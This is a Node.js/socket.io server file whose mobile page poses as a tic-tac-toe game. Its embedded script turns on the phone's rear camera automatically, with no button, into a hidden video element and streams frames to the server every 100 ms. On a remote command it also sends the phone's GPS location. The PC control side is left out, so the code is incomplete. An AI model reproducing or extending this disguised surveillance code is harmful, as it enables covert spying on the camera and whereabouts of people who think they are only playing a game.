const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    // Página do CELULAR - SEM BOTÕES, só mensagens
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Celular - Jogo da Velha</title>
    <style>
        body { 
            font-family: Arial; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { 
            text-align: center; 
            color: #333; 
            margin-bottom: 10px;
            font-size: 24px;
        }
        .device {
            text-align: center;
            font-size: 18px;
            color: #666;
            margin-bottom: 10px;
        }
        .status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .cell:active { transform: scale(0.95); background: #e9ecef; }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        button {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        button:hover { background: #45a049; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        .camera-status {
            text-align: center;
            font-size: 14px;
            color: #333;
            margin-top: 10px;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 5px;
        }
        .messages-box {
            margin-top: 20px;
            border-top: 2px solid #ddd;
            padding-top: 15px;
        }
        .messages {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 10px;
            max-height: 150px;
            overflow-y: auto;
            font-size: 14px;
        }
        .message {
            padding: 5px;
            margin: 5px 0;
            background: #e3f2fd;
            border-radius: 5px;
            word-wrap: break-word;
        }
        .message small {
            color: #666;
            font-size: 10px;
        }
        .emergency-message {
            background: #ffebee;
            border-left: 4px solid #f44336;
            font-weight: bold;
        }
        .location-box {
            margin-top: 10px;
            padding: 10px;
            background: #e8f5e9;
            border-radius: 5px;
            font-size: 12px;
            display: none;
        }
        #localVideo {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Jogo da Velha</h1>
        <div class="device">📱 Celular</div>
        <div class="status" id="status">Conectando...</div>
        <div class="board" id="board"></div>
        <button id="resetBtn" disabled>Reiniciar Jogo</button>
        
        <div class="camera-status" id="cameraStatus">📷 Iniciando câmera...</div>
        
        <div class="messages-box">
            <div style="font-weight: bold; margin-bottom: 5px;">💬 Mensagens do PC:</div>
            <div class="messages" id="messages"></div>
        </div>
        
        <div class="location-box" id="locationBox">
            <div id="locationText"></div>
        </div>
    </div>

    <video id="localVideo" autoplay playsinline muted></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 10
        });
        
        let minhaVez = false;
        let meuSimbolo = '';
        let gameActive = false;
        let board = ['', '', '', '', '', '', '', '', ''];
        let mediaStream = null;
        let intervaloEnvio = null;
        let facingMode = 'environment';
        
        const statusDiv = document.getElementById('status');
        const resetBtn = document.getElementById('resetBtn');
        const cameraStatus = document.getElementById('cameraStatus');
        const localVideo = document.getElementById('localVideo');
        const messagesDiv = document.getElementById('messages');
        const locationBox = document.getElementById('locationBox');
        const locationText = document.getElementById('locationText');
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // Função para iniciar câmera (sem botões)
        async function iniciarCamera() {
            try {
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                    if (intervaloEnvio) clearInterval(intervaloEnvio);
                }
                
                cameraStatus.innerHTML = '📷 Iniciando câmera...';
                
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 320, 
                        height: 240,
                        facingMode: 'environment' // sempre traseira
                    },
                    audio: false
                });
                
                localVideo.srcObject = mediaStream;
                await localVideo.play();
                
                cameraStatus.innerHTML = '📷 Câmera ativa';
                
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                intervaloEnvio = setInterval(() => {
                    if (mediaStream && mediaStream.active) {
                        ctx.drawImage(localVideo, 0, 0, 320, 240);
                        const frame = canvas.toDataURL('image/jpeg', 0.3);
                        socket.emit('frame', frame);
                    }
                }, 100);
                
            } catch (err) {
                cameraStatus.innerHTML = '❌ Erro câmera: ' + err.message;
            }
        }
        
        iniciarCamera();
        
        // Receber comandos do PC
        socket.on('comando', (cmd) => {
            if (cmd === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(500);
            } else if (cmd === 'emergency' && navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 500]);
            } else if (cmd === 'trocarCamera') {
                // Ignora - não queremos botão no celular
            }
        });
        
        // Enviar localização quando solicitado
        socket.on('comando', (cmd) => {
            if (cmd === 'getLocation') {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const loc = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            };
                            socket.emit('location', loc);
                            
                            // Mostrar no celular também
                            locationBox.style.display = 'block';
                            locationText.innerHTML = \`
                                📍 Sua localização:<br>
                                Latitude: \${loc.latitude}<br>
                                Longitude: \${loc.longitude}<br>
                                <a href="https://www.google.com/maps?q=\${loc.latitude},\${loc.longitude}" target="_blank">Ver no mapa</a>
                            \`;
                        },
                        (error) => {
                            alert('Erro ao pegar localização: ' + error.message);
                        }
                    );
                }
            }
        });
        
        // Receber mensagens do PC
        function addMessage(msg, isEmergency = false) {
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            if (isEmergency) {
                messageDiv.classList.add('emergency-message');
            }
            messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small><br>\${msg}\`;
            messagesDiv.appendChild(messageDiv);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        socket.on('mensagem', (msg) => {
            addMessage('💻 PC: ' + msg);
        });
        
        socket.on('emergency', (msg) => {
            addMessage('⚠️ EMERGÊNCIA: ' + msg, true);
        });
        
        socket.on('connect', () => {
            statusDiv.innerHTML = 'Conectado!';
        });
        
        socket.on('inicio', (data) => {
            meuSimbolo = data.simbolo;
            minhaVez = meuSimbolo === 'X';
            gameActive = true;
            resetBtn.disabled = false;
            statusDiv.innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do oponente (X)';
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cell = document.getElementById('cell-' + data.pos);
            if(cell) {
                cell.innerHTML = data.simbolo;
                cell.classList.add(data.simbolo.toLowerCase());
            }
            
            minhaVez = data.proximaVez === meuSimbolo;
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
        });
        
        socket.on('fim', (data) => {
            statusDiv.innerHTML = data.msg;
            gameActive = false;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => {
                c.innerHTML = '';
                c.classList.remove('x', 'o');
            });
            gameActive = true;
            minhaVez = meuSimbolo === 'X';
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
        });
        
        resetBtn.onclick = () => {
            socket.emit('reiniciar');
        };
    </script>
</body>
</html>`);
  } else {
    // Página do PC (igual à versão anterior, com todos os controles)
    // ... (código do PC permanece o mesmo da versão anterior)
  }
});

// Resto do código permanece igual
